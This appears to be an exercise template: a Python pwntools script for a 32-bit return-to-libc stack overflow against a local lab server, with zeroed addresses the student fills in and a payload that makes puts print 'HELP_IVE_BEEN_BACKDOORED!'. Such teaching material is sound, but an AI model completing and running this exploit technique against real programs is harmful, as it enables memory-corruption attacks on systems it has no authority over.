#!/usr/bin/python3
import os
import socket
import sys
import struct
import time
from pwn import *

if len(sys.argv) < 2:
    print("Syntax: %s <port num>" % __file__)
    exit(-1)

# use objdump or gdb to find the address of the puts function
# then insert that address here in integer format
puts=0x0

# use gdb to find the address of the buffer we're overflowing
# then insert that address here in integer format
target_buf=0x0

# dissassemble the HelloApp_32 code to figure out the offset
# of the return address relative to the beginning of the target buffer
# then insert that offset here in integer format
ret_addr_offset=0x0

# This is the address our return-to-libc call should return to
# you can pick any address here as the program will likely crash anyway
orig_return_addr=0x0

# set up a simple TCP connection to the server
sock = remote("127.0.0.1", int(sys.argv[1]))

# Wait for the server to send us the greeting
sock.recv(1024)

# we want to set the stack up like this:
#
# +------------------------+
# | BACKDOORED!            | <-- this is the string we want to print
# +------------------------+
# | pointer to string      | <-- this is the argument to the puts function
# +------------------------+
# | return address         | <-- this is where the new return address is
# +------------------------+
# | address of puts        | <-- this is where the original return address was
# +------------------------+
# | PADDING                |
# +------------------------+ <-- this is where the target buffer starts
#
address_of_string=target_buf+ret_addr_offset+4+4+4
injected_string=b"HELP_IVE_BEEN_BACKDOORED!"
sock.send((b"x" * (ret_addr_offset)) + # padding
                  struct.pack("<L", puts) + # address of puts, 32-bit little endian
                  struct.pack("<L", orig_return_addr) + 
                  struct.pack("<L", address_of_string) + # address of the string we want to pass to puts
                  injected_string + b"\n")

sys.stdout.buffer.write(sock.recv())
sys.stdout.buffer.write(sock.recv())
